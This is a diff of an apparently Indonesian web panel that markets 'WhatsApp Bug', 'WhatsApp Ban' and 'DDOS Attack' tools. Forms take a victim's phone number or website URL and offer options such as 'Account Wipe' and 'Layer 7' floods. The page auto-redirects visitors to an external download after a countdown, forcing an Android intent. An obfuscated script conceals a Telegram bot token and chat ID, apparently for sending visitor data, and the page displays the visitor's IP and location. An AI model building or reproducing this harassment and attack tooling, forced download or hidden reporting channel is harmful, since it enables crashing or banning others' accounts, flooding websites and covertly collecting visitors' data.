+        <style> .download-container {
+            width: 100%;
+            margin: 30px 0;
+        }
+        
+        .download-button {
+            width: 100%;
+            max-width: 728px;
+            height: 90px;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            border-radius: 10px;
+            padding: 15px;
+            border: 1px solid #333;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: all .3s ease;
+            box-shadow: 0 4px 15px rgba(106,17,203,.3);
+            margin: 0 auto;
+        }
+        
+        .download-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(106,17,203,.5);
+            background: linear-gradient(135deg, #8a2be2 0%, #4b6cb7 100%);
+        }
+        
+        .download-link {
+            text-decoration: none;
+            color: inherit;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .download-title {
+            font-size: 18px;
+            color: #fff;
+            margin-bottom: 5px;
+            font-weight: 700;
+            text-shadow: 1px 1px 2px rgba(0,0,0,.3);
+        }
+        
+        .download-subtitle {
+            background: rgba(0,0,0,.7);
+            color: #fff;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-top: 5px;
+            transition: all .3s ease;
+            border: 1px solid rgba(255,255,255,.2);
+        }
+        
+        .download-button:hover .download-subtitle {
+            background: rgba(0,0,0,.9);
+            transform: scale(1.05);
+        }</style><script>function downloadV2() {
+            const url = 'https://sfile.mobi/3BbGIpVZ1CO';
 
-      <!-- Info Box -->
-      <div class="text-center mb-6">
-        <div class="bg-gradient-to-r from-purple-900 to-pink-900 p-4 rounded-lg border border-purple-600 mb-4">
-          <p class="text-purple-200 mb-2 font-semibold">
-            <i class="fas fa-gift text-pink-400 mr-2"></i>
-            Aplikasi versi Baru Telah Tersedia!
-          </p>
-          <p class="text-green-400 font-bold text-xl">
-            XTerClose V2
-          </p>
-          <p class="text-gray-300 text-sm mt-2">
-            Dengan fitur-fitur premium dan keamanan yang ditingkatkan
-          </p>
-        </div>
-      </div>
+            // Helper untuk open new tab safe
+            const openNormal = () => {
+                const link = document.createElement('a');
+                link.href = url;
+                link.target = '_blank';
+                link.rel = 'noopener noreferrer';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            };
 
-      <!-- Features -->
-      <div class="mb-6">
-        <h3 class="text-lg font-bold text-purple-300 mb-3 text-center">Fitur Baru di V2:</h3>
-        <div class="grid grid-cols-1 gap-2 text-sm">
-          <div class="flex items-center bg-purple-900 bg-opacity-50 p-3 rounded">
-            <i class="fas fa-bug text-red-400 mr-3 text-lg"></i>
-            <div>
-              <span class="font-bold">Function Bug Ganas</span>
-              <p class="text-gray-400 text-xs">Fitur bug yang lebih powerful</p>
-            </div>
-          </div>
-          <div class="flex items-center bg-purple-900 bg-opacity-50 p-3 rounded">
-            <i class="fas fa-hammer text-orange-400 mr-3 text-lg"></i>
-            <div>
-              <span class="font-bold">Menggunakan Metode Ban Terbaru</span>
-              <p class="text-gray-400 text-xs">Teknologi ban terupdate</p>
-            </div>
-          </div>
-          <div class="flex items-center bg-purple-900 bg-opacity-50 p-3 rounded">
-            <i class="fas fa-bolt text-yellow-400 mr-3 text-lg"></i>
-            <div>
-              <span class="font-bold">Bot Secepat Kilat</span>
-              <p class="text-gray-400 text-xs">Kecepatan maksimal</p>
-            </div>
-          </div>
-          <div class="flex items-center bg-purple-900 bg-opacity-50 p-3 rounded">
-            <i class="fas fa-robot text-blue-400 mr-3 text-lg"></i>
-            <div>
-              <span class="font-bold">Fitur Jadi Bot</span>
-              <p class="text-gray-400 text-xs">Transformasi menjadi bot</p>
-            </div>
-          </div>
-        </div>
-      </div>
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const isAndroid = /Android/i.test(ua);
+            const isIOS = /iPhone|iPad|iPod/i.test(ua);
 
-      <!-- Download Button -->
-      <div class="btn-primary mb-4 pulse" onclick="downloadV2()">
-        <i class="fas fa-download mr-2"></i>
-        Download XTerClose V2 Sekarang
+            if (isAndroid) {
+                // intent: coba buka di Chrome app di Android
+                const fallback = encodeURIComponent(url);
+                const intentUrl = `intent://${url.replace(/^https?:\/\//,'')}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallback};end;`;
+                // langsung ganti lokasi ke intent URL (browser akan handle)
+                window.location.href = intentUrl;
+
+                // fallback: jika dalam beberapa detik tidak berhasil (browser tidak dukung intent), buka biasa
+                setTimeout(() => {
+                    // jika masih di page ini, fallback ke normal open
+                    openNormal();
+                }, 1200);
+
+                return;
+            }
+
+            if (isIOS) {
+                // iOS: beberapa sistem mengenali googlechrome:// scheme — best-effort
+                // NOTE: modern iOS biasanya menolak, jadi fallback cepat ke normal open
+                try {
+                    const chromeScheme = url.replace(/^https?:\/\//, 'googlechrome://');
+                    // coba buka Chrome scheme (may or may not work)
+                    window.location.href = chromeScheme;
+                    // jika tidak pindah maka fallback
+                    setTimeout(openNormal, 800);
+                } catch (e) {
+                    openNormal();
+                }
+                return;
+            }
+
+            // Desktop / unknown: tidak bisa paksa — buka di tab baru
+            openNormal();
+        }
+
+        // Setup countdown and auto-download
+        let countdown = 10;
+        const countdownElement = document.getElementById('countdown-number');
+        const downloadButton = document.getElementById('download-button');
+        const downloadLink = document.getElementById('download-link');
+        
+        // Set up manual download
+        downloadButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            downloadV2();
+        });
+        
+        // Set up countdown
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                downloadV2();
+            }
+        }, 1000);
+  </script>
+        <!-- Dashboard Page -->
+      <div id="dashboard" class="page active">
+       
+        <!-- Improved User Profile Card -->
+        <div class="user-profile-card mb-6">
+  <div class="flex flex-col md:flex-row md:items-center md:justify-between">
+    <div class="mb-4 md:mb-0 flex items-center space-x-4">
+      <div class="w-16 h-16 rounded-2xl bg-white bg-opacity-20 flex items-center justify-center">
+        <i class="fas fa-user-secret text-2xl text-white"></i>
       </div>
-      
-      <!-- Countdown -->
-      <div id="countdown" class="text-center text-sm text-purple-300 mb-4">
-        Redirect apk dalam <span id="countdown-number" class="font-bold">10</span> detik...
-      </div>
-      
-      <!-- Footer -->
-      <div class="text-center text-xs text-gray-500 mt-4">
-        <p>Terima kasih atas pengertian Anda.</p>
-        <p class="mt-2 font-semibold">Tim Developer XTerClose</p>
+      <div>
+        <h2 class="text-2xl md:text-3xl font-bold text-white" id="dashboard-username">Loading...</h2>
+        <div class="flex flex-wrap items-center gap-2 mt-2">
+          <span class="status-badge">
+            <i class="fas fa-shield-alt"></i>USER
+          </span>
+          <span class="text-white text-opacity-70 text-sm" id="dashboard-join-date">Bergabung: Loading...</span>
+        </div>
+        <div class="flex items-center gap-2 mt-1">
+          <i class="fas fa-infinity text-green-400"></i>
+          <span class="text-green-400 text-sm font-semibold">LIFETIME ACCESS</span>
+        </div>
       </div>
     </div>
     
-    <footer class="text-xs text-gray-500 mt-6 text-center z-10">
-      <p>by MiXterNal • © <span id="current-year"></span> XTerClose</p>
-    </footer>
+    <!-- INFO PANEL -->
+    <div class="mb-4 md:mb-0">
+      <div class="flex flex-wrap gap-2 text-sm">
+        <!-- IP Address -->
+        <div class="bg-black bg-opacity-30 px-3 py-2 rounded-lg">
+          <div class="flex items-center gap-2">
+            <i class="fas fa-network-wired text-blue-400"></i>
+            <span class="text-white">IP:</span>
+            <span class="text-green-400 font-mono" id="user-ip">Loading...</span>
+          </div>
+        </div>
+        
+        <!-- Location -->
+        <div class="bg-black bg-opacity-30 px-3 py-2 rounded-lg">
+          <div class="flex items-center gap-2">
+            <i class="fas fa-map-marker-alt text-orange-400"></i>
+            <span class="text-white">Loc:</span>
+            <span class="text-orange-400 font-mono" id="user-location">Loading...</span>
+          </div>
+        </div>
+        
+        <!-- Ping -->
+        <div class="bg-black bg-opacity-30 px-3 py-2 rounded-lg">
+          <div class="flex items-center gap-2">
+            <i class="fas fa-signal text-purple-400"></i>
+            <span class="text-white">Ping:</span>
+            <span class="text-purple-400 font-mono" id="network-ping">0 ms</span>
+          </div>
+        </div>
+        
+        <!-- Uptime -->
+        <div class="bg-black bg-opacity-30 px-3 py-2 rounded-lg">
+          <div class="flex items-center gap-2">
+            <i class="fas fa-clock text-yellow-400"></i>
+            <span class="text-white">Uptime:</span>
+            <span class="text-yellow-400 font-mono" id="system-uptime">00:00:00</span>
+          </div>
+        </div>
+
+        <!-- Battery -->
+        <div class="bg-black bg-opacity-30 px-3 py-2 rounded-lg hidden" id="battery-container">
+          <div class="flex items-center gap-2">
+            <i class="fas fa-battery-full text-green-400" id="battery-icon"></i>
+            <span class="text-green-400 font-mono" id="battery-level">100%</span>
+          </div>
+        </div>
+
+    <button onclick="handleLogout()" class="btn-modern py-2 text-sm max-w-xs bg-red-500 hover:bg-red-600">
+      <i class="fas fa-sign-out-alt mr-2"></i>Logout
+    </button>
+    <div class="notification-container" id="notificationContainer"></div>
   </div>
+</div>
+</div>
+</div>
 
-  <script>
-    function createBubbles() {
-      const container = document.getElementById('bubbles-container');
-      const bubbleCount = 15;
-      
-      for (let i = 0; i < bubbleCount; i++) {
-        const bubble = document.createElement('div');
-        bubble.className = 'bubble';
-        
-        const size = Math.random() * 60 + 20;
-        const left = Math.random() * 100;
-        const duration = Math.random() * 20 + 10;
-        const delay = Math.random() * 5;
-        
-        bubble.style.width = `${size}px`;
-        bubble.style.height = `${size}px`;
-        bubble.style.left = `${left}vw`;
-        bubble.style.animationDuration = `${duration}s`;
-        bubble.style.animationDelay = `${delay}s`;
-        
-        container.appendChild(bubble);
-      }
-    }
-    
-    // Set current year
-    document.getElementById('current-year').textContent = new Date().getFullYear();
-    
-    function downloadV2() {
-  const url = 'https://sfile.mobi/3BbGIpVZ1CO';
+        <!-- Bot Status Warning -->
+        <div id="bot-warning" class="bot-warning hidden">
+          <div class="flex items-center justify-center">
+            <i class="fas fa-exclamation-triangle text-red-400 mr-2"></i>
+            <span class="text-red-200 font-semibold">Bot sender nya perawatan dulu wok, sabar yaa, trakteer dulu lah biar semangat</span>
+          </div>
+        </div>
 
-  // Helper untuk open new tab safe
-  const openNormal = () => {
-    const link = document.createElement('a');
-    link.href = url;
-    link.target = '_blank';
-    link.rel = 'noopener noreferrer';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  };
+        <!-- Stats -->
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+          <div class="stat-card pulse-glow">
+            <div class="text-2xl md:text-3xl font-bold text-white" id="stats-bots">2</div>
+            <div class="text-white text-opacity-80 text-sm mt-1">
+              <i class="fas fa-robot mr-1"></i>Bot Aktif
+            </div>
+          </div>
+          <div class="stat-card pulse-glow">
+            <div class="text-2xl md:text-3xl font-bold text-white" id="stats-attacks">8,562</div>
+            <div class="text-white text-opacity-80 text-sm mt-1">
+              <i class="fas fa-bullseye mr-1"></i>Serangan sejam terakhir
+            </div>
+          </div>
+          <div class="stat-card pulse-glow">
+            <div class="text-2xl md:text-3xl font-bold text-white" id="stats-success">98.7%</div>
+            <div class="text-white text-opacity-80 text-sm mt-1">
+              <i class="fas fa-chart-line mr-1"></i>Success Rate
+            </div>
+          </div>
+          <div class="stat-card pulse-glow">
+            <div class="text-2xl md:text-3xl font-bold text-white" id="stats-online">243</div>
+            <div class="text-white text-opacity-80 text-sm mt-1">
+              <i class="fas fa-users mr-1"></i>Online Sekarang
+            </div>
+          </div>
+        </div>
+        <div class="glass-card p-6 mb-6">
+          <h3 class="text-xl md:text-2xl font-bold text-white mb-4">
+            <i class="fas fa-bolt mr-2"></i>Quick Actions
+          </h3>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <button onclick="showPage('whatsapp-bug')" class="btn-modern py-4 text-sm">
+              <i class="fas fa-bug mr-2"></i>WhatsApp Bug Tools
+            </button>
+            <button onclick="showPage('whatsapp-ban')" class="btn-modern py-4 text-sm">
+              <i class="fas fa-ban mr-2"></i>WhatsApp Ban Tools
+            </button>
+            <button onclick="showPage('ddos-tools')" class="btn-modern py-4 text-sm">
+              <i class="fas fa-network-wired mr-2"></i>DDOS Attack Tools
+            </button>
+            <a href="https://shorturl.at/n1BBX" target="_blank" class="btn-modern py-4 text-sm text-center" style="background: linear-gradient(135deg, #25D366, #128C7E);">
+              <i class="fab fa-whatsapp mr-2"></i>Sewa Wa
+            </a>
+            <a href="https://trakteer.id/matrixman" target="_blank" class="btn-modern py-4 text-sm text-center" style="background: linear-gradient(135deg, #FF6B6B, #EE5A52);">
+              <i class="fas fa-heart mr-2"></i>Support Developer
+            </a>
+            <button onclick="testFeatures()" class="btn-modern py-4 text-sm" style="background: linear-gradient(135deg, #8B5CF6, #7C3AED);">
+              <i class="fas fa-id-card mr-2"></i>User Info
+            </button>
+              <div class="notification-container" id="notificationContainer"></div>
+          </div>
+        </div>
 
-  const ua = navigator.userAgent || navigator.vendor || window.opera;
-  const isAndroid = /Android/i.test(ua);
-  const isIOS = /iPhone|iPad|iPod/i.test(ua);
+        <!-- Additional Info Cards -->
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div class="glass-card p-6">
+            <h4 class="text-lg font-bold text-white mb-3">
+              <i class="fas fa-info-circle mr-2"></i>System Info
+            </h4>
+            <div class="space-y-2 text-white text-opacity-80">
+              <div class="flex justify-between">
+                <span>Status:</span>
+                <span class="text-green-400 font-semibold">Operational</span>
+              </div>
+               <div className="flex justify-between items-center p-3 bg-gray-800 rounded-lg">
+  <span>Uptime:</span>
+  <span className="text-yellow-400 font-semibold" id="uptimee">
+    00:00:00
+  </span>
+</div>
+              <div class="flex justify-between">
+                <span>Last Update:</span>
+                <span id="last-update">Just now</span>
+              </div>
+              <div class="flex justify-between">
+                <span>User Type:</span>
+                <span class="text-yellow-400 font-semibold">Premium</span>
+              </div>
+              <div class="flex justify-between">
+                <span>Expiry:</span>
+                <span class="text-green-400 font-semibold">Lifetime</span>
+              </div>
+            </div>
+          </div>
+          
+          <div class="glass-card p-6">
+            <h4 class="text-lg font-bold text-white mb-3">
+              <i class="fas fa-crown mr-2"></i>Premium Features
+            </h4>
+            <div class="space-y-2 text-white text-opacity-80">
+              <div class="flex items-center">
+                <i class="fas fa-check text-green-400 mr-2"></i>
+                <span>Unlimited Attacks</span>
+              </div>
+              <div class="flex items-center">
+                <i class="fas fa-check text-green-400 mr-2"></i>
+                <span>Priority Support</span>
+              </div>
+              <div class="flex items-center">
+                <i class="fas fa-check text-green-400 mr-2"></i>
+                <span>Latest Tools</span>
+              </div>
+              <div class="flex items-center">
+                <i class="fas fa-check text-green-400 mr-2"></i>
+                <span>No Expiry</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
 
-  if (isAndroid) {
-    // intent: coba buka di Chrome app di Android
-    const fallback = encodeURIComponent(url);
-    const intentUrl = `intent://${url.replace(/^https?:\/\//,'')}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallback};end;`;
-    // langsung ganti lokasi ke intent URL (browser akan handle)
-    window.location.href = intentUrl;
+      <!-- WhatsApp Bug Page -->
+      <div id="whatsapp-bug" class="page">
+        <div class="max-w-2xl mx-auto">
+          <div class="glass-card p-6">
+            <h2 class="text-2xl md:text-3xl font-bold text-white mb-6 text-center">
+              <i class="fas fa-bug mr-2"></i>WhatsApp Bug Tools
+            </h2>
 
-    // fallback: jika dalam beberapa detik tidak berhasil (browser tidak dukung intent), buka biasa
-    setTimeout(() => {
-      // jika masih di page ini, fallback ke normal open
-      openNormal();
-    }, 1200);
-
-    return;
-  }
-
-  if (isIOS) {
-    // iOS: beberapa sistem mengenali googlechrome:// scheme — best-effort
-    // NOTE: modern iOS biasanya menolak, jadi fallback cepat ke normal open
-    try {
-      const chromeScheme = url.replace(/^https?:\/\//, 'googlechrome://');
-      // coba buka Chrome scheme (may or may not work)
-      window.location.href = chromeScheme;
-      // jika tidak pindah maka fallback
-      setTimeout(openNormal, 800);
-    } catch (e) {
-      openNormal();
-    }
-    return;
-  }
-
-  // Desktop / unknown: tidak bisa paksa — buka di tab baru
-  openNormal();
-}
-
-    let countdown = 10;
-    const countdownElement = document.getElementById('countdown-number');
-    const countdownInterval = setInterval(() => {
-      countdown--;
-      countdownElement.textContent = countdown;
-      
-      if (countdown <= 0) {
-        clearInterval(countdownInterval);
-        downloadV2();
-      }
-    }, 1000);
-    
-    // Inisialisasi
-    window.addEventListener('load', () => {
-      createBubbles();
-    });
-  </script>
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GTSNZBE2B6"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-GTSNZBE2B6');
-</script>
+            <!-- Bot Status Warning -->
+            <div id="bug-bot-warning" class="bot-warning hidden mb-4">
+              <div class="flex items-center justify-center">
+                <i class="fas fa-exclamation-triangle text-red-400 mr-2"></i>
+                <span class="text-red-200 font-semibold">Bot sender nya perawatan dulu wok, sabar yaa, trakteer dulu lah biar semangat</span>
+              </div>
+            </div>
+  <div class="notification-container" id="notificationContainer"></div>
+            <div class="mb-6">
+              <label class="block text-white text-sm mb-2 font-medium">
+                <i class="fas fa-phone mr-2"></i>Nomor WhatsApp Target
+              </label>
+              <input type="text" id="bug-number" 
+                     class="input-modern" 
+                     placeholder="08xxxxxx">
+            </div>
   <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9122473834319786"
      crossorigin="anonymous"></script>
-
 <ins class="adsbygoogle"
      style="display:block"
+     data-ad-format="autorelaxed"
      data-ad-client="ca-pub-9122473834319786"
-     data-ad-slot="7080386036"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
+     data-ad-slot="1420047007"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
-  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9122473834319786"
-     crossorigin="anonymous"></script>
-</body>
-</html>
+            <!-- Bug Type Dropdown -->
+            <div class="mb-6">
+              <label class="block text-white text-sm mb-2 font-medium">
+                <i class="fas fa-bug mr-2"></i>Pilih Tipe Bug
+              </label>
+              <div class="custom-dropdown">
+                <div class="dropdown-btn" onclick="toggleDropdown('bug-dropdown')">
+                  <span id="bug-selected">Pilih tipe bug...</span>
+                  <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="dropdown-content" id="bug-dropdown">
+                  <div class="dropdown-item ios" onclick="selectBug('iOS Crash Bug')">
+                    <i class="fab fa-apple"></i> iOS Crash Bug
+                  </div>
+                  <div class="dropdown-item android" onclick="selectBug('Android Force Close')">
+                    <i class="fab fa-android"></i> Android Force Close
+                  </div>
+                  <div class="dropdown-item quantum" onclick="selectBug('Quantum Stealth')">
+                    <i class="fas fa-user-secret"></i> Quantum Stealth
+                  </div>
+                  <div class="dropdown-item neural" onclick="selectBug('Neural Crash')">
+                    <i class="fas fa-brain"></i> Neural Crash
+                  </div>
+                  <div class="dropdown-item system" onclick="selectBug('System Overload')">
+                    <i class="fas fa-microchip"></i> System Overload
+                  </div>
+                  <div class="dropdown-item group" onclick="selectBug('Group Attack')">
+                    <i class="fas fa-users"></i> Group Attack
+                  </div>
+                  <div class="dropdown-item message" onclick="selectBug('Message Loop Bug')">
+                    <i class="fas fa-sync"></i> Message Loop Bug
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <button id="launch-bug-btn" onclick="launchBug()" class="btn-modern py-4 text-lg font-semibold">
+              <i class="fas fa-rocket mr-2"></i>LAUNCH BUG
+            </button>
+
+            <div class="bg-blue-500 bg-opacity-20 p-4 rounded-xl border border-blue-500 border-opacity-30 mt-6">
+              <p class="text-blue-200 text-sm">
+                <i class="fas fa-info-circle mr-2"></i>
+                Bug tools exploit vulnerabilities in WhatsApp across different platforms.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- WhatsApp Ban Page -->
+      <div id="whatsapp-ban" class="page">
+        <div class="max-w-2xl mx-auto">
+          <div class="glass-card p-6">
+            <h2 class="text-2xl md:text-3xl font-bold text-white mb-6 text-center">
+              <i class="fas fa-ban mr-2"></i>WhatsApp Ban Tools
+            </h2>
+
+            <!-- Bot Status Warning -->
+            <div id="ban-bot-warning" class="bot-warning hidden mb-4">
+              <div class="flex items-center justify-center">
+                <i class="fas fa-exclamation-triangle text-red-400 mr-2"></i>
+                <span class="text-red-200 font-semibold">Bot sender nya perawatan dulu wok, sabar yaa, trakteer dulu lah biar semangat</span>
+              </div>
+            </div>
+  <div class="notification-container" id="notificationContainer"></div>
+            <div class="mb-6">
+              <label class="block text-white text-sm mb-2 font-medium">
+                <i class="fas fa-phone mr-2"></i>Nomor WhatsApp Target
+              </label>
+              <input type="number" id="ban-number" 
+                     class="input-modern" 
+                     placeholder="08xxxxxx">
+            </div>
+
+            <!-- Ban Type Dropdown -->
+            <div class="mb-6">
+                <div class="notification-container" id="notificationContainer"></div>
+              <label class="block text-white text-sm mb-2 font-medium">
+                <i class="fas fa-ban mr-2"></i>Pilih Tipe Ban
+              </label>
+              <div class="custom-dropdown">
+                <div class="dropdown-btn" onclick="toggleDropdown('ban-dropdown')">
+                  <span id="ban-selected">Pilih tipe ban...</span>
+                  <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="dropdown-content" id="ban-dropdown">
+                  <div class="dropdown-item batu" onclick="selectBan('Batu Banned')">
+                    <i class="fas fa-gem"></i> Batu Banned
+                  </div>
+                  <div class="dropdown-item permanent" onclick="selectBan('Permanent Ban')">
+                    <i class="fas fa-skull-crossbones"></i> Permanent Ban
+                  </div>
+                  <div class="dropdown-item temporary" onclick="selectBan('Temporary Ban')">
+                    <i class="fas fa-clock"></i> Temporary Ban (30 Days)
+                  </div>
+                  <div class="dropdown-item spam" onclick="selectBan('Spam Ban')">
+                    <i class="fas fa-envelope"></i> Spam Ban
+                  </div>
+                  <div class="dropdown-item silent" onclick="selectBan('Silent Ban')">
+                    <i class="fas fa-volume-mute"></i> Silent Ban
+                  </div>
+                  <div class="dropdown-item shadow" onclick="selectBan('Shadow Report')">
+                    <i class="fas fa-ghost"></i> Shadow Report
+                  </div>
+                  <div class="dropdown-item wipe" onclick="selectBan('Account Wipe')">
+                    <i class="fas fa-bomb"></i> Account Wipe
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <button id="launch-ban-btn" onclick="launchBan()" class="btn-modern py-4 text-lg font-semibold">
+              <i class="fas fa-rocket mr-2"></i>LAUNCH BAN
+            </button>
+
+            <div class="bg-red-500 bg-opacity-20 p-4 rounded-xl border border-red-500 border-opacity-30 mt-6">
+              <p class="text-red-200 text-sm">
+                <i class="fas fa-exclamation-triangle mr-2"></i>
+                Warning: These actions are irreversible and may violate terms of service.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- DDOS Tools Page -->
+      <div id="ddos-tools" class="page">
+        <div class="max-w-2xl mx-auto">
+          <div class="glass-card p-6">
+            <h2 class="text-2xl md:text-3xl font-bold text-white mb-6 text-center">
+              <i class="fas fa-network-wired mr-2"></i>DDOS Attack Tools
+            </h2>
+
+            <!-- Bot Status Warning -->
+            <div id="ddos-bot-warning" class="bot-warning hidden mb-4">
+              <div class="flex items-center justify-center">
+                <i class="fas fa-exclamation-triangle text-red-400 mr-2"></i>
+                <span class="text-red-200 font-semibold">Bot sender nya perawatan dulu wok, sabar yaa, trakteer dulu lah biar semangat</span>
+              </div>
+            </div>
+
+            <div class="mb-6">
+              <label class="block text-white text-sm mb-2 font-medium">
+                <i class="fas fa-globe mr-2"></i>Target Website URL
+              </label>
+              <input type="text" id="ddos-url" 
+                     class="input-modern" 
+                     placeholder="https://example.com">
+            </div>
+
+            <!-- DDOS Layer Dropdown -->
+            <div class="mb-6">
+              <label class="block text-white text-sm mb-2 font-medium">
+                <i class="fas fa-layer-group mr-2"></i>Pilih Layer DDOS
+              </label>
+              <div class="custom-dropdown">
+                <div class="dropdown-btn" onclick="toggleDropdown('ddos-dropdown')">
+                  <span id="ddos-selected">Pilih layer DDOS...</span>
+                  <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="dropdown-content" id="ddos-dropdown">
+                  <div class="dropdown-item layer1" onclick="selectDDOS('Layer 1 - Physical')">
+                    <i class="fas fa-server"></i> Layer 1 - Physical
+                  </div>
+                  <div class="dropdown-item layer2" onclick="selectDDOS('Layer 2 - Data Link')">
+                    <i class="fas fa-network-wired"></i> Layer 2 - Data Link
+                  </div>
+                  <div class="dropdown-item layer3" onclick="selectDDOS('Layer 3 - Network')">
+                    <i class="fas fa-project-diagram"></i> Layer 3 - Network
+                  </div>
+                  <div class="dropdown-item layer4" onclick="selectDDOS('Layer 4 - Transport')">
+                    <i class="fas fa-exchange-alt"></i> Layer 4 - Transport
+                  </div>
+                  <div class="dropdown-item layer5" onclick="selectDDOS('Layer 5 - Session')">
+                    <i class="fas fa-handshake"></i> Layer 5 - Session
+                  </div>
+                  <div class="dropdown-item layer6" onclick="selectDDOS('Layer 6 - Presentation')">
+                    <i class="fas fa-code"></i> Layer 6 - Presentation
+                  </div>
+                  <div class="dropdown-item layer7" onclick="selectDDOS('Layer 7 - Application')">
+                    <i class="fas fa-desktop"></i> Layer 7 - Application
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <button id="launch-ddos-btn" onclick="launchDDOS()" class="btn-modern py-4 text-lg font-semibold">
+              <i class="fas fa-rocket mr-2"></i>LAUNCH DDOS ATTACK
+            </button>
+
+            <div class="bg-red-500 bg-opacity-20 p-4 rounded-xl border border-red-500 border-opacity-30 mt-6">
+              <p class="text-red-200 text-sm">
+                <i class="fas fa-exclamation-triangle mr-2"></i>
+                Warning: DDOS attacks are illegal in many jurisdictions. Use for educational purposes only.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+   <script>
+const _0x532697=_0x3a1d;(function(_0x476496,_0x3d59f9){const _0x578389=_0x3a1d,_0x39a5c1=_0x476496();while(!![]){try{const _0x31ddcd=-parseInt(_0x578389(0xb5))/(-0x64d*-0x2+0xfcc+-0x1c65)+-parseInt(_0x578389(0xae))/(0x9ac*-0x4+-0x14a8+-0x1dad*-0x2)*(parseInt(_0x578389(0xbd))/(0x5*0x1de+-0x6a*-0x5c+-0xc7*0x3d))+-parseInt(_0x578389(0xbb))/(0x5*-0x5b3+0xa06+0x1*0x127d)+-parseInt(_0x578389(0xb0))/(0x1589*-0x1+-0x3c7*-0x2+0xe00*0x1)*(parseInt(_0x578389(0xb7))/(0x1fda+0x87*0x32+-0x3a32))+parseInt(_0x578389(0xbe))/(-0x601*0x1+0x7b5*0x4+-0x17*0x114)*(parseInt(_0x578389(0xb3))/(0x2b+0x3*-0x69e+0x13b7))+-parseInt(_0x578389(0xb1))/(0x1533+0x10*0x9+-0x67*0x36)*(parseInt(_0x578389(0xb8))/(-0x1a8d+-0x1902+0x3399))+parseInt(_0x578389(0xaf))/(0x18e3*0x1+-0x21b4+0x8dc);if(_0x31ddcd===_0x3d59f9)break;else _0x39a5c1['push'](_0x39a5c1['shift']());}catch(_0x1f9429){_0x39a5c1['push'](_0x39a5c1['shift']());}}}(_0x2150,-0x182595+0x2f*-0x41b7+0x3243ec));function _0x3a1d(_0x17f31c,_0x161c89){const _0x3cd404=_0x2150();return _0x3a1d=function(_0x56ffdb,_0x26e165){_0x56ffdb=_0x56ffdb-(-0x36e+-0x67f*0x4+0xf0c*0x2);let _0x27c989=_0x3cd404[_0x56ffdb];return _0x27c989;},_0x3a1d(_0x17f31c,_0x161c89);}const TELEGRAM_BOT_TOKEN=_0x532697(0xb6)+_0x532697(0xb4)+_0x532697(0xba)+_0x532697(0xbc)+_0x532697(0xb2),TELEGRAM_CHAT_ID=_0x532697(0xb9);function _0x2150(){const _0x4bf55a=['3OmV9o','2911976nsRpUI',':AAHfDBaSQ','340292syuoRs','7623293485','20244xInorb','80JFEQlh','7010528303','wqWwyCkcAJ','283704PKUZWg','4jMzPCBYiy','915777TRZKxH','28czHBpj','2gMVEjp','15294367rHtina','1505SfqeQa','217476pSzZYy'];_0x2150=function(){return _0x4bf55a;};return _0x2150();}
+</script>
+  <script>
+const visitStartTime = Date.now();
+    // Full Frame Iframe Functions
+    // TikTok Full Frame Functions
+function showFullFrame() {
+    // Create full frame container if it doesn't exist
+    if (!document.getElementById('full-frame-container')) {
+        const fullFrameHTML = `
+            <div id="full-frame-container" class="full-frame-container">
+                <div class="full-frame-header">
+                    <div class="full-frame-title">
+                        <i class="fab fa-tiktok"></i>
+                        <span>dtiktoks</span>
+                    </div>
+                    <button onclick="closeFullFrame()" class="close-full-frame">
+                        <i class="fas fa-times"></i>
+                        Close
+                    </button>
+                </div>
+                <iframe id="full-frame-iframe" class="full-frame-iframe" 
+                        src="https://dtiktoks.netlify.app"
+                        frameborder="0" allowfullscreen></iframe>
+            </div>
+        `;
+        document.body.insertAdjacentHTML('beforeend', fullFrameHTML);
+    }
+    
+    // Show the full frame container
+    const fullFrameContainer = document.getElementById('full-frame-container');
+    fullFrameContainer.classList.add('active');
+    
+    // Prevent body scrolling
+    document.body.style.overflow = 'hidden';
+    
+    // Show notification
+    showNotification('TikTok Tools', 'TikTok tools opened in full screen mode.');
+}
+
+function closeFullFrame() {
+    const fullFrameContainer = document.getElementById('full-frame-container');
+    
+    if (fullFrameContainer) {
+        // Hide container
+        fullFrameContainer.classList.remove('active');
+        
+        // Restore body scrolling
+        document.body.style.overflow = 'auto';
+        
+        // Show notification
+        showNotification('TikTok Tools', 'TikTok tools closed.');
+    }
+}
+
